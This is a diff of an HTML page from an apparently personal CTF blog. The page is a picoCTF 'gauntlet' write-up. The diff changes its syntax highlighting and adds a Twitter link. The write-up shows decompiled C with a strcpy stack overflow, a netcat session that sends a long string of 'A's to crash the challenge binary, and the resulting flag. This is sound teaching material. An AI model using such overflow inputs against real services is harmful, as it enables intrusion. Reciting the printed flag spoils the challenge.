@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -73,20 +74,19 @@
 <p>Comments: This series of problems has to do with binary protections and how they affect exploiting a very simple program. How far can you make it in the gauntlet? gauntlet nc mercury.picoctf.net 12294</p>
 <h2 id="write-up">Write up:</h2>
 <p>Looking at the decompiled code I see that the main function is:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  <span style="color:Blue;">char</span> dest[108];
+  char dest[108];
   __gid_t rgid; 
   FILE *stream; 
-  <span style="color:Blue;">char</span> *s;
+  char *s;
 
-  s = (<span style="color:Blue;">char</span> *)malloc(1000uLL);
-  stream = fopen(<span style="color:#A31515;">&quot;flag.txt&quot;</span>, <span style="color:#A31515;">&quot;r&quot;</span>);
-  <span style="color:Blue;">if</span> ( !stream )
+  s = (char *)malloc(1000uLL);
+  stream = fopen("flag.txt", "r");
+  if ( !stream )
   {
     puts(
-      <span style="color:#A31515;">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);
+      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
     exit(0);
   }
   fgets(flag, 64, stream);
@@ -100,21 +100,16 @@
   fgets(s, 1000, stdin);
   s[999] = 0;
   strcpy(dest, s);
-  <span style="color:Blue;">return</span> 0;
-}
-</pre></div>
-</div>
+  return 0;
+}</code></pre>
 <p>After the 2nd read the program copies a string that can be 999 long to a string that is only 107 long so this is a stack overflow problem. I opened the instance and just put a bunch of A's into the 2nd read:</p>
-<pre><code>nc mercury.picoctf.net 12294
+<pre><code class="language-text">nc mercury.picoctf.net 12294
 c
 c
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-fbd01d62c0e369e6de3d63b4b21d3830
-</code></pre>
+fbd01d62c0e369e6de3d63b4b21d3830</code></pre>
 <p>The flag was:</p>
-<pre><code>fbd01d62c0e369e6de3d63b4b21d3830
-</code></pre>
-
+<pre><code class="language-text">fbd01d62c0e369e6de3d63b4b21d3830</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -127,5 +122,6 @@ fbd01d62c0e369e6de3d63b4b21d3830
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
